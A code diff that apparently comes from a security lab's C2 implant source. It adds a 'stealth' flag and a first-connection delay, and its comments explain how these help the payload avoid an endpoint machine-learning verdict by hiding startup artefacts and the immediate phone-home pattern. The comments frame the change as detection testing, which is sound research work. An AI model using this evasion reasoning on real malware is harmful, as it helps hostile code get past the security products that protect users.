@@ -86,6 +86,51 @@
 #define PX_CAPABILITIES 0
 #endif
 
+/* The stealth flag.
+ *
+ * WHAT IT TURNS OFF
+ *     Three things the payload does that have nothing to do with talking
+ *     to the C2:
+ *
+ *       1. the marker file written next to the image at startup
+ *       2. the log file written next to the image on every line
+ *       3. the immediate first connection
+ *
+ * WHY
+ *     The endpoint's machine-learning verdict on this payload arrives
+ *     at EXECUTION, not at build time. What it sees first is a fresh
+ *     unsigned binary that immediately creates two text files next to
+ *     itself and then opens a socket to an unusual port. That is a
+ *     textbook trojan opening move, and no amount of string encoding
+ *     changes it -- the strings are not what the engine is reading.
+ *
+ *     So the measurement is: turn the artefacts off, delay the
+ *     connection, and see whether the verdict changes. If it does, the
+ *     artefact was the trigger. If it does not, the trigger is the
+ *     behaviour and the answer is a different technique.
+ *
+ *     THAT IS THE LAB'S METHOD APPLIED TO THE LAB'S OWN TOOLING: one
+ *     variable at a time, and the result recorded either way.
+ *
+ * WHAT IT DOES NOT DO
+ *     It does not remove a single technique from the capability
+ *     library. The rules still have behaviour to match, because the
+ *     behaviour is still there -- it is just quieter.
+ */
+#ifndef PX_STEALTH
+#define PX_STEALTH 0
+#endif
+
+/* Seconds to wait before the FIRST connection attempt.
+ *
+ * Only meaningful with PX_STEALTH. The delay blurs the "process
+ * started and immediately phoned home" shape, which is the other half
+ * of what the machine-learning engine is reading.
+ */
+#ifndef PX_STEALTH_DELAY
+#define PX_STEALTH_DELAY 0
+#endif
+
 /* ================================================================== */
 /* The report the payload sends to the C2 server at startup.            */
 /* ================================================================== */
